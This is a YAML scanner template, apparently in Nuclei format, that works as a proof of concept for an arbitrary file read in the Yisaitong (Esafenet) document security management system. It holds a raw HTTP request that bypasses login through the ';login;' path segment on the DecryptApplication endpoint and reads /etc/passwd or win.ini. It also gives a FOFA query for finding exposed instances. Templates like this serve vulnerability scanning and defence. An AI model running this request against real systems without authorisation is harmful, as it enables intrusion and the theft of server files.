id: poc-yaml-yisaitong-esafenet-decryptapplication-anyfile-read
info:
  name: 亿赛通电子文档安全管理系统 DecryptApplication 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 文件读取
  metadata:
    finger: 亿赛通电子文档安全管理系统
    fofa: app="亿赛通-电子文档安全管理系统"

variables:
  file:
    - "c:/windows/win.ini"
    - "/etc/passwd"

http:
  - raw:
      - |
        GET /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath={{file}}&uploadFileId=1&fileName1=ox9wcxwck7g1 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "!contains(body, '<')"
          - "(contains(body, '; for 16-bit app support') && contains(body, '[files]')) || (contains(body, 'root:') && contains(body, '/bin'))"
